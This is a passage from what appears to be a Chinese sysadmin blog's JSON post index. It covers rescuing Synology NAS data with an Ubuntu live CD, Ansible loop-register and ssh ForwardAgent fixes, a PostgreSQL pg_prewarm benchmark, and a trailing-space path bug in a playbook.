然後就會發生我之前寫的這篇的狀況\nhttps://h.cowbay.org/post/what-a-piss-in-synology-document/\n問題發生了，總是要想辦法解決\nscan lv root@ubuntu:~# lvscan ACTIVE \u0026#39;/dev/vg1/syno_vg_reserved_area\u0026#39; [12.00 MiB] inherit ACTIVE \u0026#39;/dev/vg1/volume_1\u0026#39; [5.44 TiB] inherit OK ，在 vg1 底下有兩個 volume ，看大小來判斷，第二個是我們要的\n用底下的指令就可以掛載了\nmount /dev/vg1/volume_1 /mnt 請依照自己的環境，把第一個路徑改掉，如果要掛載到別的目錄，那也把第二個 /mnt 改掉\nroot@ubuntu:/dev# mount /dev/vg1/volume_1 /mnt root@ubuntu:/dev# cd /mnt root@ubuntu:/mnt# ls @appstore @database @EP_trash @MailScanner @S2S aquota.group @download @iSCSITrg music synoquota.db aquota.user @eaDir lost+found nfsforprox @tmp @clamav @EP @maillog photo video OK，可以看到原本NAS 下的目錄了，接下來就可以進行檔案複製了！\n","date":"2020-01-03T15:43:45+08:00","image":"https://h.cowbay.org/images/post-default-11.jpg","permalink":"https://h.cowbay.org/post/rescue-synology-nas-with-ubuntu-livecd/","title":"[筆記] 用ubuntu livecd 救援群暉 synology NAS內的資料 / rescue synology nas with ubuntu livecd"},{"content":"2020/01/02 2020 上工的第一天，公司碩果僅存的唯一一台 Synology DS415+ 也終於掛了\n開機沒多久就連不上，反覆幾次之後，出現了開機時所有燈號都狂閃的狀況\n終於宣告不治\n問題很明顯的就是Intel C2000 系列 CPU 的瑕疵\n總之，機器老早就過保了，上面放的是 proxmox 的 vm 檔案\n在NAS掛點之後，就從備份檔把這些VM還原回來了\n想說網路上很多文章說只要焊一個電阻上去就可以修復\n就把機器和硬碟先放著，等有空再去買電阻回來玩玩看\n結果user今天早上就在靠腰，說上面有一台開發用的VM上面的歷史紀錄很重要\n幹，很重要是不會自己備份逆？\n又不跟我說很重要，要備份，然後自己也不做備份\n然後現在VM 不見了，再來靠腰？？\n幹！真的不要以為資訊公司的員工就比較有sense ，屁！\n不過呢，人微言輕，還是只好鼻子摸摸，想辦法救出來\n然後就找到了群暉的這篇文章\nhttps://www.synology.com/zh-tw/knowledgebase/DSM/tutorial/Storage/How_can_I_recover_data_from_my_DiskStation_using_a_PC\n如何使用電腦復原存放在 Synology NAS 上的資料？ 若您的 Synology NAS 故障，可以輕鬆透過電腦與 Ubuntu Live CD 復原資料。請確認 Synology NAS 硬碟上運行的檔案系統是 EXT4 或 Btrfs，並依照下列步驟來復原資料。此處將以 Ubuntu 18.04 版本作為範例： 1.準備一台電腦，該電腦必須具備足夠的硬碟插槽以安裝從 Synology NAS 取出的硬碟。 2.將硬碟從 Synology NAS 取出，並安裝到電腦。若使用 RAID 或 SHR 配置，您必須將所有硬碟 (Hot Spare 硬碟除外) 同時安裝到電腦。 3.按照此教學 Create a bootable USB stick on Windows 來建立 Ubuntu 環境。 4.前往左下角的顯示應用程式選單。 5.在搜尋欄位輸入 Terminal 並選擇終端機。 6.若 Synology NAS 上的磁碟配置為 RAID 或 SHR，請依照步驟 7 到 10 操作；若您想復原的檔案位於僅使用一顆硬碟的基本儲存類型機種，請跳至步驟 10。 7.輸入以下指令 (sudo 會將執行權限轉換為 root )。 Ubuntu@ubuntu:~$ sudo -i 8.輸入以下指令來安裝 mdadm 和 lvm2 (皆為 RAID 管理工具)。若沒有安裝 lvm2，vgchange 將無法運作。 root@ubuntu:~$ apt-get update root@ubuntu:~$ apt-get install -y mdadm lvm2 9.輸入以下指令來掛載所有從 Synology NAS 取出的硬碟，結果可能會因 Synology NAS 上的儲存集區配置而有所不同。 root@ubuntu:~$ mdadm -Asf \u0026amp;\u0026amp; vgchange -ay 10.輸入以下指令來將所有硬碟掛載為唯讀以存取資料。在 ${device_path} 輸入裝置路徑，${mount_point} 輸入掛載點，您的資料將會被置於掛載點的路徑。 $ mount ${device_path} ${mount_point} -o ro 好， 1-9 都沒什麼問題，但是有人可以幫忙翻譯翻譯 10 是在工三小？\n當然，我能理解因為每一臺NAS的環境不同，所以會有一些不同的變數\n但是假如你是一個單純的user ，只是想要救資料，好不容易找了臺電腦\n把硬碟都接上去，用ubuntu liveCD 開機，乖乖做了1-9的步驟\n接著一定會傻眼， 什麼是 ${device_path} ?? 什麼是 ${mount_point} ???\n寫文件的人你就不能配合個圖片，去說明應該要怎麼辨別 device_path ? mount_point 又是什麼？\n這很簡單呀！\n做完 9 的指令，其實就會回復你 NAS 分割區的名稱\n好像叫什麼 vg1 的 \u0026lt;\u0026mdash;這個就是變數，可能每一臺都不同，但是你起碼做個範例給人家看啊！\n然後會在 /dev/vg1 底下看到當初建立的磁區 (我的叫 volume_1)\n至於 mount_point 就是看你要掛載到系統的哪個目錄底下\n所以我就要執行\nmount /dev/vg1/volume_1 /mnt 這樣就可以把NAS上的分割給掛進liveCD ，就可以進行資料複製了！\n連一份文件都做不好，真的是服了這些據說很高薪的「工程師」..\n","date":"2020-01-03T11:45:56+08:00","image":"https://h.cowbay.org/images/post-default-16.jpg","permalink":"https://h.cowbay.org/post/what-a-piss-in-synology-document/","title":"[碎念] Synology 群暉的文件不知道在工三小 / what a piss in synology document"},{"content":"今天在寫一支客製化 firefox 的playbook\n因為firefox 會給每個user 建立一個由亂數字串組成的default profile\n所以每個user的 default profile 都不同\n也因此在用register處理的時候，碰到了一些問題\nTASK 內容 其實task 內容沒有很複雜，簡單來說，就是先檢查user的 firefox profile 目錄\n如果存在就pass，如果不存在就幫user建立\n- name: check if user profile exists become_user: \u0026#34;{{ item.name }}\u0026#34; stat: path: \u0026#34;{{ firefox_home }}\u0026#34; register: profile_exists with_items: \u0026#34;{{ users }}\u0026#34; 但是在接下來的task在執行的時候，碰到了問題\nansible 提示說profile_exists 沒有 stat 屬性\n用過 stat module 的，應該都知道結果會是 var_name.stat.xxxx 這樣的用法\n所以可以肯定的是 stat 這個屬性一定在\n可是也一定有什麼問題，造成取不到值\n當然就是先debug 來看看(有些不重要的屬性，我就先拿掉了)\nok: [hqdc075] =\u0026gt; { \u0026#34;profile_exists\u0026#34;: { \u0026#34;changed\u0026#34;: false, \u0026#34;msg\u0026#34;: \u0026#34;All items completed\u0026#34;, \u0026#34;results\u0026#34;: [ { \u0026#34;ansible_loop_var\u0026#34;: \u0026#34;item\u0026#34;, \u0026#34;changed\u0026#34;: false, \u0026#34;failed\u0026#34;: false, \u0026#34;invocation\u0026#34;: { \u0026#34;module_args\u0026#34;: { \u0026#34;checksum_algorithm\u0026#34;: \u0026#34;sha1\u0026#34;, \u0026#34;follow\u0026#34;: false, \u0026#34;get_attributes\u0026#34;: true, \u0026#34;get_checksum\u0026#34;: true, \u0026#34;get_md5\u0026#34;: false, \u0026#34;get_mime\u0026#34;: true, \u0026#34;path\u0026#34;: \u0026#34;/home/changch/.mozilla/firefox\u0026#34; } }, \u0026#34;item\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;changch\u0026#34; }, \u0026#34;stat\u0026#34;: { \u0026#34;atime\u0026#34;: 1577348614.335831, \u0026#34;attr_flags\u0026#34;: \u0026#34;e\u0026#34;, \u0026#34;attributes\u0026#34;: [ \u0026#34;extents\u0026#34; ], \u0026#34;executable\u0026#34;: true, \u0026#34;exists\u0026#34;: true, \u0026#34;gid\u0026#34;: 19000, \u0026#34;inode\u0026#34;: 925342, } }, { \u0026#34;ansible_loop_var\u0026#34;: \u0026#34;item\u0026#34;, \u0026#34;changed\u0026#34;: false, \u0026#34;failed\u0026#34;: false, \u0026#34;invocation\u0026#34;: { \u0026#34;module_args\u0026#34;: { \u0026#34;checksum_algorithm\u0026#34;: \u0026#34;sha1\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;/home/administrator/.mozilla/firefox\u0026#34; } }, \u0026#34;item\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;administrator\u0026#34; }, \u0026#34;stat\u0026#34;: { \u0026#34;atime\u0026#34;: 1577349447.4605036, \u0026#34;attr_flags\u0026#34;: \u0026#34;e\u0026#34;, \u0026#34;attributes\u0026#34;: [ \u0026#34;extents\u0026#34; ], \u0026#34;block_size\u0026#34;: 4096, \u0026#34;blocks\u0026#34;: 8, \u0026#34;charset\u0026#34;: \u0026#34;binary\u0026#34;, \u0026#34;exists\u0026#34;: false, } }, 一開始是先注意到了為什麼裡面還有 item ?\n再往上看，就發現多了一個 results 把原本的list 清單給包起來了\n所以原本用 profile_exists.stat.exists 可以取得目錄是否存在(true/false)\n但是現在因為多了一層 results ，所以變成取不到值\n沒關係，既然知道了有多了一層 results ，那就知道要怎麼做了\n修正後續task 後面的task 稍微改一下，在指定 with_items 的時候，直接指定 profile_exists.results\n接下來的用法就比較簡單了，跟原本接stat 變數的語法差不多\n- name: run firefox to create default profile become_user: \u0026#34;{{ item.item.name }}\u0026#34; shell: \u0026#34;firefox --headless \u0026amp;\u0026#34; ignore_errors: True when: item.stat.exists == false with_items: \u0026#34;{{ profile_exists.results }}\u0026#34; 透過這次的playbook 又知道了怎麼承接 loop register 跑出來的值，又學了一課\n本來一開始的想法是register dynamic variable name\n像是 a_exist,b_exist,c_exist 這樣\n不過ansible 不這樣處理，會自動的把所有結果都包在一個 results list 裡面\n也算是還滿好用的啦\n","date":"2019-12-27T09:09:05+08:00","image":"https://h.cowbay.org/images/post-default-7.jpg","permalink":"https://h.cowbay.org/post/ansible-get-value-from-loop-register/","title":"[筆記]在ansible中，取得loop register後的值/ Ansible Get Value From Loop Register"},{"content":"正確來說，我不曉得到底怎麼「稱呼」這個 forwardx11 / forwardagent\n總之就是在寫一隻ansible playbook\n目的是用來安裝、設定 firefox\n包含安裝 firefox addon\n但是一開始在執行的時候，碰到了一些錯誤\n錯誤訊息 playbook 在執行時的錯誤訊息如下\nTASK [firefox : Create profiles] ************************************************************************************************* Tuesday 24 December 2019 14:28:58 +0800 (0:00:00.067) 0:00:00.946 ****** An exception occurred during task execution. To see the full traceback, use -vvv. The error was: Exception: b\u0026#39;Error: no DISPLAY environment variable specified\\n\u0026#39; fatal: [hqdc075]: FAILED! =\u0026gt; { \u0026#34;changed\u0026#34;: false, \u0026#34;rc\u0026#34;: 1 } MSG: MODULE FAILURE See stdout/stderr for the exact error MODULE_STDOUT: Traceback (most recent call last): File \u0026#34;/home/minion/.ansible/tmp/ansible-tmp-1577168938.839576-98315583350576/AnsiballZ_firefox_profile.py\u0026#34;, line 102, in \u0026lt;module\u0026gt; _ansiballz_main() File \u0026#34;/home/minion/.ansible/tmp/ansible-tmp-1577168938.839576-98315583350576/AnsiballZ_firefox_profile.py\u0026#34;, line 94, in _ansiballz_main invoke_module(zipped_mod, temp_path, ANSIBALLZ_PARAMS) File \u0026#34;/home/minion/.ansible/tmp/ansible-tmp-1577168938.839576-98315583350576/AnsiballZ_firefox_profile.py\u0026#34;, line 40, in invoke_module runpy.run_module(mod_name=\u0026#39;ansible.modules.firefox_profile\u0026#39;, init_globals=None, run_name=\u0026#39;__main__\u0026#39;, alter_sys=False) File \u0026#34;/usr/lib/python3.6/runpy.py\u0026#34;, line 208, in run_module return _run_code(code, {}, init_globals, run_name, mod_spec) File \u0026#34;/usr/lib/python3.6/runpy.py\u0026#34;, line 85, in _run_code exec(code, run_globals) File \u0026#34;/tmp/ansible_firefox_profile_payload_7amnitoq/ansible_firefox_profile_payload.zip/ansible/modules/firefox_profile.py\u0026#34;, line 119, in \u0026lt;module\u0026gt; File \u0026#34;/tmp/ansible_firefox_profile_payload_7amnitoq/ansible_firefox_profile_payload.zip/ansible/modules/firefox_profile.py\u0026#34;, line 109, in main File \u0026#34;/tmp/ansible_firefox_profile_payload_7amnitoq/ansible_firefox_profile_payload.zip/ansible/modules/firefox_profile.py\u0026#34;, line 88, in create Exception: b\u0026#39;Error: no DISPLAY environment variable specified\\n\u0026#39; MODULE_STDERR: Shared connection to 192.168.11.75 closed. PLAY RECAP *********************************************************************************************************************** hqdc075 : ok=3 changed=1 unreachable=0 failed=1 skipped=0 rescued=0 ignored=0 稍微google 一下，都說是要設定 ssh forwardagent\n所以翻了一下 ansible 的設定文件，看要怎麼做\n發現可以用 ssh_args 加入-o xxxxxx\n可是又找不到 ssh 怎麼用這個 -o\n只好又回去找辣個男人問看看ssh的參數\n-o option Can be used to give options in the format used in the configuration file. This is useful for specifying options for which there is no separate command-line flag. For full details of the options listed below, and their possi‐ ble values, see ssh_config(5). AddKeysToAgent AddressFamily BatchMode BindAddress CanonicalDomains CanonicalizeFallbackLocal CanonicalizeHostname CanonicalizeMaxDots CanonicalizePermittedCNAMEs CertificateFile ChallengeResponseAuthentication CheckHostIP Ciphers ClearAllForwardings Compression ConnectionAttempts ConnectTimeout ControlMaster ControlPath ControlPersist DynamicForward EscapeChar ExitOnForwardFailure FingerprintHash ForwardAgent ForwardX11 ForwardX11Timeout ForwardX11Trusted GatewayPorts GlobalKnownHostsFile GSSAPIAuthentication GSSAPIDelegateCredentials HashKnownHosts Host HostbasedAuthentication HostbasedKeyTypes HostKeyAlgorithms HostKeyAlias HostName IdentitiesOnly ..... ..... 很長，就不全部列出來了\n看到重點是 ForwardAgent / ForwardX11 了\n但是真的不曉得怎麼區分這兩種\n反正只有兩個，就 try and error 吧\n在ansible 中修改inventory file ，在想要修改的 host 後面加入 ssh_args=\u0026quot;-o ForwardAgent=yes\u0026quot;\nhqdc075 ansible_host=192.168.11.75 ssh_args=\u0026#34;-o ForwardAgent=yes\u0026#34; 或者 ansible.cfg\n在[ssh_connection]區段中\n加入\nssh_args=\u0026#34;-o ForwardAgent=yes\u0026#34; 再跑一次 就看到正常執行了\nPLAY RECAP ************************************************************************************************ hqdc075 : ok=7 changed=2 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 Tuesday 24 December 2019 14:37:37 +0800 (0:00:01.027) 0:00:17.879 ****** =============================================================================== firefox : Install extensions --- 10.92s install related pip packages ---- 4.71s firefox : Install user prefs ---- 1.03s firefox : Create profiles ------- 0.49s firefox : export display -------- 0.44s firefox : Configure profiles ---- 0.10s firefox : debug ex ---- 0.07s 這次的過程，順便了解了ssh 加入 -X 可以在ssh session 中執行遠端主機上的圖形界面程式\n例如\nssh -X username@hostname firefox 就可以透過ssh 執行遠端的firefox\n如下圖\n很酷！\n","date":"2019-12-24T14:41:37+08:00","image":"https://h.cowbay.org/images/post-default-14.jpg","permalink":"https://h.cowbay.org/post/ansible-ssh-forwardagent/","title":"[筆記] ansible 設定 ssh_args 開啟 ForwardX11 / config ansible ssh_args to enable forwardagent"},{"content":"老闆提到想要把新系統的 postgresql 資料庫都撈到記憶體裡面\n但是否決了我提出的ramdisk 作法(因為當機的話，資料就沒了)\n在找資料的時候，發現了這個postgresql 的 pg_prewarm extension\n好像有點意思？就來測試看看吧！\n只是目前還不知道該怎麼解讀測試的數據就是了\u0026hellip;\n幹！林北真的不是 DBA 啦 =.=\n安裝系統、postgresql 資料庫什麼的就不提了，那不是這次的重點\n修改 postgresql.conf 編輯postgresql.conf，開啟平行處理以及設定可用記憶體容量\n這台測試機的環境是一台三代i7 , 24G RAM , 240G SSD，安裝debian 10(buster)\n# load libiriaes # 其實這次不會用到pg_stat_statements ，不過出於習慣，還是加入開機自動載入吧 shared_preload_libraries = \u0026#39;pg_stat_statements\u0026#39; #------------------------------------------------------------------------------ # CUSTOMIZED OPTIONS #------------------------------------------------------------------------------ max_connections = 20 shared_buffers = 6GB effective_cache_size = 18GB maintenance_work_mem = 1536MB checkpoint_completion_target = 0.7 wal_buffers = 16MB default_statistics_target = 100 random_page_cost = 1.1 effective_io_concurrency = 200 work_mem = 78643kB min_wal_size = 1GB max_wal_size = 2GB max_worker_processes = 8 max_parallel_workers_per_gather = 4 max_parallel_workers = 8 重新啟動postgresql ，準備開始測試囉！\n轉換成 postgres 身份後，進入 psql\n建立測試資料庫 postgres=# create database test; CREATE DATABASE postgres=# 連接測試資料庫、建立pg_prewarm extension postgres=# \\c test ; You are now connected to database \u0026#34;test\u0026#34; as user \u0026#34;postgres\u0026#34;. test=# CREATE EXTENSION pg_prewarm; CREATE EXTENSION test=# 建立測試資料表，塞入500萬筆資料 test=# \\timing Timing is on. test=# CREATE TABLE test_tbl AS SELECT floor(random() * (9923123) + 1)::int FROM generate_series(1, 5000000) AS id; SELECT 5000000 Time: 2940.602 ms (00:02.941) test=# 檢查看看剛剛建立的table 用了多少空間 哎呀，看起來用得不多啊\ntest=# SELECT pg_size_pretty(pg_relation_size(\u0026#39;test_tbl\u0026#39;)); 173 MB 玩大一點，塞個一億筆資料好了\ntest=# drop table test_tbl; Time: 0.361 ms test=# CREATE TABLE test_tbl AS SELECT floor(random() * (99343) + 1)::int FROM generate_series(1, 100000000) AS id; SELECT 100000000 Time: 6321.415 ms (00:06.321) test=# SELECT pg_size_pretty(pg_relation_size(\u0026#39;test_tbl\u0026#39;)); pg_size_pretty | 3457 MB Time: 0.589 ms test=# 好，現在資料庫長到3457MB了\n先來執行一些初步的取得基本數據\ntest=# explain (analyze,buffers) select count(*) from test_tbl; QUERY PLAN ------------------------------------------------------------------------------------------------------------------------ Finalize Aggregate (cost=755978.52..755978.53 rows=1 width=8) (actual time=3331.917..3331.918 rows=1 loops=1) Buffers: shared hit=160 read=442318 -\u0026gt; Gather (cost=755978.10..755978.51 rows=4 width=8) (actual time=3331.876..3333.674 rows=5 loops=1) Workers Planned: 4 Workers Launched: 4 Buffers: shared hit=160 read=442318 -\u0026gt; Partial Aggregate (cost=754978.10..754978.11 rows=1 width=8) (actual time=3329.279..3329.280 rows=1 loops=5) Buffers: shared hit=160 read=442318 -\u0026gt; Parallel Seq Scan on test_tbl (cost=0.00..692478.08 rows=25000008 width=0) (actual time=0.029..1924.601 rows=20000000 loops=5) Buffers: shared hit=160 read=442318 Planning Time: 0.040 ms Execution Time: 3333.729 ms (12 rows) (END) 可以看到打中buffer 的部份其實很少，只有 160 ，大部分都是讀進去buffer (442318)\n來看看 buffer 的使用狀況\ntest=# CREATE EXTENSION pg_buffercache; CREATE EXTENSION test=# select c.relname,pg_size_pretty(count(*) * 8192) as buffered, test-# round(100.0 * count(*) / ( test(# select setting from pg_settings test(# where name=\u0026#39;shared_buffers\u0026#39;)::integer,1) test-# as buffer_percent, test-# round(100.0*count(*)*8192 / pg_table_size(c.oid),1) as percent_of_relation test-# from pg_class c inner join pg_buffercache b on b.relfilenode = c.relfilenode inner test-# join pg_database d on ( b.reldatabase =d.oid and d.datname =current_database()) test-# group by c.oid,c.relname order by 3 desc limit 10; relname | buffered | buffer_percent | percent_of_relation --------------+------------+----------------+--------------------- test_tbl | 18 MB | 0.3 | 0.5 pg_am | 8192 bytes | 0.0 | 20.0 pg_index | 24 kB | 0.0 | 37.5 pg_amproc | 32 kB | 0.0 | 50.0 pg_cast | 16 kB | 0.0 | 33.3 pg_depend | 64 kB | 0.0 | 13.3 pg_amop | 48 kB | 0.0 | 54.5 pg_namespace | 8192 bytes | 0.0 | 20.0 pg_opclass | 16 kB | 0.0 | 28.6 pg_aggregate | 8192 bytes | 0.0 | 16.7 (10 rows) Time: 148.719 ms test=# 可以看到這個 test_tbl 只有0.5% 被撈到shared_buffers 裡面\n接下來就把這個table全部推到shared_buffers 裡面去\ntest=# select pg_prewarm(\u0026#39;test_tbl\u0026#39;,\u0026#39;buffer\u0026#39;); pg_prewarm ------------ 442478 (1 row) Time: 1938.043 ms (00:01.938) test=# 然後再來看一次shared_buffers的使用狀況\ntest=# select c.relname,pg_size_pretty(count(*) * 8192) as buffered, round(100.0 * count(*) / ( select setting from pg_settings where name=\u0026#39;shared_buffers\u0026#39;)::integer,1) as buffer_percent, round(100.0*count(*)*8192 / pg_table_size(c.oid),1) as percent_of_relation from pg_class c inner join pg_buffercache b on b.relfilenode = c.relfilenode inner join pg_database d on ( b.reldatabase =d.oid and d.datname =current_database()) group by c.oid,c.relname order by 3 desc limit 10; relname | buffered | buffer_percent | percent_of_relation --------------+------------+----------------+--------------------- test_tbl | 3457 MB | 56.3 | 100.0 pg_am | 8192 bytes | 0.0 | 20.0 pg_index | 24 kB | 0.0 | 37.5 pg_amproc | 32 kB | 0.0 | 50.0 pg_cast | 16 kB | 0.0 | 33.3 pg_depend | 64 kB | 0.0 | 13.3 pg_amop | 48 kB | 0.0 | 54.5 pg_namespace | 8192 bytes | 0.0 | 20.0 pg_opclass | 16 kB | 0.0 | 28.6 pg_aggregate | 8192 bytes | 0.0 | 16.7 (10 rows) Time: 2778.354 ms (00:02.778) test=# OK ，可以看到 test_tbl 已經通通被載入 shared_buffers 中\nbuffered 表示表格被載入shared_buffers的大小\nbuffer_percent 表示這個表格佔用多少shared_buffers 的比例\npercent_of_relation 表示這個表格有多少比例被載入 shared_buffers\n再來跑一次explain看看狀況\ntest=# explain (analyze,buffers) select count(*) from test_tbl; Time: 3551.785 ms (00:03.552) Finalize Aggregate (cost=755978.52..755978.53 rows=1 width=8) (actual time=3427.286..3427.287 rows=1 loops=1) Buffers: shared hit=442478 -\u0026gt; Gather (cost=755978.10..755978.51 rows=4 width=8) (actual time=3427.215..3551.326 rows=5 loops=1) Workers Planned: 4 Workers Launched: 4 Buffers: shared hit=442478 -\u0026gt; Partial Aggregate (cost=754978.10..754978.11 rows=1 width=8) (actual time=3423.659..3423.659 rows=1 loops=5) Buffers: shared hit=442478 -\u0026gt; Parallel Seq Scan on test_tbl (cost=0.00..692478.08 rows=25000008 width=0) (actual time=0.017..1976.744 rows=20000000 loops=5) Buffers: shared hit=442478 Planning Time: 0.039 ms Execution Time: 3551.365 ms (12 rows) 這邊就可以看到都是從buffer 讀出來所以 hit=442478\n看樣子表格還是太小，所以沒有完全發揮？那再來把表格加大！\n先重開一次 postgresql 清除buffer\n然後重新建立表格\ntest=# drop table test_tbl; DROP TABLE Time: 297.493 ms test=# CREATE TABLE test_tbl AS test-# SELECT floor(random() * (993343) + 1)::int FROM generate_series(1, 300000000) AS id; SELECT 300000000 Time: 290660.607 ms (04:50.661) test=# 一樣，看看用了多少容量\ntest=# SELECT pg_size_pretty(pg_relation_size(\u0026#39;test_tbl\u0026#39;)); pg_size_pretty ---------------- 10 GB (1 row) Time: 0.474 ms test=# 哇哈哈，用了10G ，這次還不撐爆你！\n跑explain 看看狀況\ntest=# explain (analyze,buffers) select count(*) from test_tbl; Time: 22909.065 ms (00:22.909) QUERY PLAN --------------------------------------------------------------------------------------------------------------------------- Finalize Aggregate (cost=2265934.72..2265934.73 rows=1 width=8) (actual time=22906.045..22906.045 rows=1 loops=1) Buffers: shared hit=2080 read=1325354 dirtied=1295425 written=1295265 -\u0026gt; Gather (cost=2265934.30..2265934.71 rows=4 width=8) (actual time=22905.997..22908.522 rows=5 loops=1) Workers Planned: 4 Workers Launched: 4 Buffers: shared hit=2080 read=1325354 dirtied=1295425 written=1295265 -\u0026gt; Partial Aggregate (cost=2264934.30..2264934.31 rows=1 width=8) (actual time=22903.473..22903.474 rows=1 loops=5) Buffers: shared hit=2080 read=1325354 dirtied=1295425 written=1295265 -\u0026gt; Parallel Seq Scan on test_tbl (cost=0.00..2077434.24 rows=75000024 width=0) (actual time=0.040..18374.277 rows=60000000 loops=5) Buffers: shared hit=2080 read=1325354 dirtied=1295425 written=1295265 Planning Time: 0.094 ms Execution Time: 22908.571 ms (12 rows) 看一下現在 shared_buffers 使用狀況\n可以看到這個 test_tbl 幾乎沒被放入 shared_buffers 中\ntest=# select c.relname,pg_size_pretty(count(*) * 8192) as buffered, round(100.0 * count(*) / ( select setting from pg_settings where name=\u0026#39;shared_buffers\u0026#39;)::integer,1) as buffer_percent, round(100.0*count(*)*8192 / pg_table_size(c.oid),1) as percent_of_relation from pg_class c inner join pg_buffercache b on b.relfilenode = c.relfilenode inner join pg_database d on ( b.reldatabase =d.oid and d.datname =current_database()) group by c.oid,c.relname order by 3 desc limit 10; relname | buffered | buffer_percent | percent_of_relation --------------+------------+----------------+--------------------- test_tbl | 18 MB | 0.3 | 0.2 pg_am | 8192 bytes | 0.0 | 20.0 pg_index | 24 kB | 0.0 | 37.5 pg_amproc | 32 kB | 0.0 | 50.0 pg_cast | 16 kB | 0.0 | 33.3 pg_depend | 64 kB | 0.0 | 13.3 pg_amop | 48 kB | 0.0 | 54.5 pg_namespace | 8192 bytes | 0.0 | 20.0 pg_opclass | 16 kB | 0.0 | 28.6 pg_aggregate | 8192 bytes | 0.0 | 16.7 (10 rows) Time: 163.936 ms test=# 強制把test_tbl 全部塞進 shared_buffers\ntest=# select pg_prewarm(\u0026#39;test_tbl\u0026#39;,\u0026#39;buffer\u0026#39;); pg_prewarm ------------ 1327434 (1 row) Time: 7472.805 ms (00:07.473) test=# 確認一下test_tbl 有沒有被整個塞進去\ntest=# select c.relname,pg_size_pretty(count(*) * 8192) as buffered, round(100.0 * count(*) / ( select setting from pg_settings where name=\u0026#39;shared_buffers\u0026#39;)::integer,1) as buffer_percent, round(100.0*count(*)*8192 / pg_table_size(c.oid),1) as percent_of_relation from pg_class c inner join pg_buffercache b on b.relfilenode = c.relfilenode inner join pg_database d on ( b.reldatabase =d.oid and d.datname =current_database()) group by c.oid,c.relname order by 3 desc limit 10; relname | buffered | buffer_percent | percent_of_relation --------------+------------+----------------+--------------------- test_tbl | 6142 MB | 100.0 | 59.2 pg_am | 8192 bytes | 0.0 | 20.0 pg_index | 24 kB | 0.0 | 37.5 pg_amproc | 32 kB | 0.0 | 50.0 pg_cast | 16 kB | 0.0 | 33.3 pg_depend | 24 kB | 0.0 | 5.0 pg_amop | 40 kB | 0.0 | 45.5 pg_namespace | 8192 bytes | 0.0 | 20.0 pg_opclass | 16 kB | 0.0 | 28.6 pg_aggregate | 8192 bytes | 0.0 | 16.7 (10 rows) Time: 4985.366 ms (00:04.985) test=# GOOD ！ let\u0026rsquo;s do explain again !\ntest=# explain (analyze,buffers) select count(*) from test_tbl; Time: 11451.188 ms (00:11.451) QUERY PLAN -------------------------------------------------------------------------------------------------------------------- Finalize Aggregate (cost=2265934.72..2265934.73 rows=1 width=8) (actual time=11231.664..11231.664 rows=1 loops=1) Buffers: shared hit=785963 read=541471 -\u0026gt; Gather (cost=2265934.30..2265934.71 rows=4 width=8) (actual time=11231.606..11450.719 rows=5 loops=1) Workers Planned: 4 Workers Launched: 4 Buffers: shared hit=785963 read=541471 -\u0026gt; Partial Aggregate (cost=2264934.30..2264934.31 rows=1 width=8) (actual time=11228.829..11228.830 rows=1 loops=5) Buffers: shared hit=785963 read=541471 -\u0026gt; Parallel Seq Scan on test_tbl (cost=0.00..2077434.24 rows=75000024 width=0) (actual time=0.037..6414.711 rows=60000000 loops=5) Buffers: shared hit=785963 read=541471 Planning Time: 0.039 ms Execution Time: 11450.781 ms (12 rows) 確認一下，果然大部分都打到cache 了，但是因為shared_buffers 不夠大，所以還會從磁碟讀取一部分\n而且時間也比之前還沒塞進shared_buffers 的時候要快了不少\n22908.571 \u0026ndash;\u0026gt; 11450.781 ms\n從這次的測試看來，我想如果有足夠大的記憶體，能夠把資料表都塞入shared_buffers 中\n應該可以帶來不錯的效能增幅！\n","date":"2019-12-20T14:31:42+08:00","image":"https://h.cowbay.org/images/post-default-9.jpg","permalink":"https://h.cowbay.org/post/test-pg_prewarm/","title":"[筆記] 測試 postgresql 的pg_prewarm 對效能的影響 / test pg_prewarm in postgresql 11"},{"content":"剛剛在跑一個修改過的playbook，卻發現一個詭異的狀況\n在用template產生檔案之前，爲了避免錯誤，所以我先用 file module 去建立目錄\n怪就怪在，建立目錄的task沒錯，但是要產生檔案時，卻出現了目的目錄不存在的錯誤\n原本的 playbook 大概長這樣\n- name: make dconf/profile folder file: path: \u0026#34;{{ item }} \u0026#34; state: directory owner: root group: root mode: a+rx with_items: - /etc/dconf/profile - /etc/dconf/db/msb.d - name: generate dconf/profile/user template template: src: dconf/profile/user.j2 dest: /etc/dconf/profile/user owner: root group: root ### the name must be 00_msb_settings ?? - name: generate 00_msb_settings template: src: dconf/db/msb.d/00_msb_settings.j2 dest: /etc/dconf/db/msb.d/00_msb_settings owner: root group: root 執行時的 LOG\nTASK [userdesktop-1804 : generate 00_msb_settings] ******************************************************************************* Wednesday 18 December 2019 14:36:26 +0800 (0:00:00.328) 0:02:20.653 **** fatal: [hqpc108.abc.com.tw]: FAILED! =\u0026gt; { \u0026#34;changed\u0026#34;: false, \u0026#34;checksum\u0026#34;: \u0026#34;06439b9bba9698ce7813525a4523afce72faefe8\u0026#34; } MSG: Destination directory /etc/dconf/db/msb.d does not exist 怪了，登錄遠端電腦看一下\nadministrator@ubuntu:/etc/dconf/db$ ls -alrt total 28 drwxr-xr-x 2 root root 4096 Dec 18 12:22 ibus.d drwxr-xr-x 2 root root 4096 Dec 18 14:27 gdm.d -rw-r--r-- 1 root root 2730 Dec 18 14:27 ibus -rw-r--r-- 1 root root 240 Dec 18 14:27 gdm drwxr-xr-x 2 root root 4096 Dec 18 14:36 \u0026#39;msb.d \u0026#39; drwxr-xr-x 5 root root 4096 Dec 18 14:36 . drwxr-xr-x 4 root root 4096 Dec 18 14:37 .. 發現了怪異的狀況，那個 msb.d 被單引號包起來了，代表包含了一些特殊字元\n複製貼上後，才注意到，原來最後多了一個空白。\n回去看 playbook 內容\n- name: make dconf/profile folder file: path: \u0026#34;{{ item }} \u0026#34; state: directory owner: root group: root mode: a+rx with_items: - /etc/dconf/profile - /etc/dconf/db/msb.d 問題就出在 path 這邊，在 }} 和 \u0026quot; 之間，多了一個空格\n然後ansible就很忠實的重現了這個語法\n所以建立了 \u0026ldquo;/etc/dconf/profile \u0026quot; 以及\u0026rdquo; /etc/dconf/db/msb.d \u0026quot;\n於是就造成了後面的錯誤。\n把 playbook 裡面的 